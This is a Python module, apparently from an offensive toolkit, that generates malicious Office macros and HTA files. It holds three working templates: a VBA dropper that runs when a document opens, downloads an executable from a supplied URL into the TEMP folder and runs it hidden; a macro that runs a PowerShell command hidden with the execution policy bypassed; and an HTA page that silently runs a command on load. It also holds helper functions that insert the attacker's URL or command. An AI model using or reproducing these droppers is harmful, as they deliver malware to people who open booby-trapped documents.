"""
modules/payload/macros.py — VBA/Office macro generation
"""

MACRO_TEMPLATES = {
    "vba_dropper": {
        "name": "VBA Dropper",
        "description": "Downloads and executes a payload via HTTP",
        "usage": "Use in Word/Excel Macros",
        "template": """
Sub AutoOpen()
    Payload
End Sub

Sub Document_Open()
    Payload
End Sub

Public Function Payload()
    Dim strUrl As String
    Dim strFile As String
    Dim objXMLHTTP As Object
    Dim objADOStream As Object
    Dim objShell As Object
    
    strUrl = "{target}"
    strFile = Environ("TEMP") & "\\payload.exe"
    
    Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
    objXMLHTTP.Open "GET", strUrl, False
    objXMLHTTP.Send
    
    If objXMLHTTP.Status = 200 Then
        Set objADOStream = CreateObject("ADODB.Stream")
        objADOStream.Open
        objADOStream.Type = 1 'adTypeBinary
        objADOStream.Write objXMLHTTP.ResponseBody
        objADOStream.Position = 0
        objADOStream.SaveToFile strFile, 2 'adSaveCreateOverWrite
        objADOStream.Close
        
        Set objShell = CreateObject("WScript.Shell")
        objShell.Run strFile, 0, False
    End If
End Function
"""
    },
    "vba_powershell": {
        "name": "VBA PowerShell Executor",
        "description": "Executes a PowerShell command silently",
        "usage": "Use in Word/Excel Macros",
        "template": """
Sub AutoOpen()
    ExecutePS
End Sub

Sub Document_Open()
    ExecutePS
End Sub

Public Function ExecutePS()
    Dim objShell As Object
    Dim psCommand As String
    
    ' PowerShell command
    psCommand = "{target}"
    
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command " & psCommand, 0, False
End Function
"""
    },
    "hta_dropper": {
        "name": "HTA Dropper",
        "description": "HTML Application that executes a payload",
        "usage": "Serve as an .hta file",
        "template": """
<html>
<head>
<script language="VBScript">
    Sub Window_OnLoad
        Dim objShell
        Set objShell = CreateObject("WScript.Shell")
        objShell.Run "{target}", 0, False
        window.close()
    End Sub
</script>
</head>
<body>
Loading...
</body>
</html>
"""
    }
}

def list_macros() -> list[dict]:
    """Return all available macros."""
    return [{"id": k, "name": v["name"], "description": v["description"], "usage": v["usage"]} 
            for k, v in MACRO_TEMPLATES.items()]

def generate_macro(macro_id: str, target: str) -> str | None:
    """Generate a macro from a template."""
    if macro_id not in MACRO_TEMPLATES:
        return None
        
    template = MACRO_TEMPLATES[macro_id]["template"]
    return template.replace("{target}", target).strip()

def generate_dropper(url: str, filename: str = 'payload.exe') -> dict:
    """Legacy helper for generating a dropper macro."""
    code = generate_macro("vba_dropper", url)
    return {
        "type": "vba_dropper",
        "code": code,
        "description": MACRO_TEMPLATES["vba_dropper"]["description"],
        "usage": MACRO_TEMPLATES["vba_dropper"]["usage"]
    }

def generate_powershell_macro(command: str) -> dict:
    """Legacy helper for generating a PowerShell macro."""
    code = generate_macro("vba_powershell", command)
    return {
        "type": "vba_powershell",
        "code": code,
        "description": MACRO_TEMPLATES["vba_powershell"]["description"],
        "usage": MACRO_TEMPLATES["vba_powershell"]["usage"]
    }

def generate_hta_dropper(url: str) -> dict:
    """Legacy helper for generating an HTA dropper."""
    code = generate_macro("hta_dropper", url)
    return {
        "type": "hta_dropper",
        "code": code,
        "description": MACRO_TEMPLATES["hta_dropper"]["description"],
        "usage": MACRO_TEMPLATES["hta_dropper"]["usage"]
    }
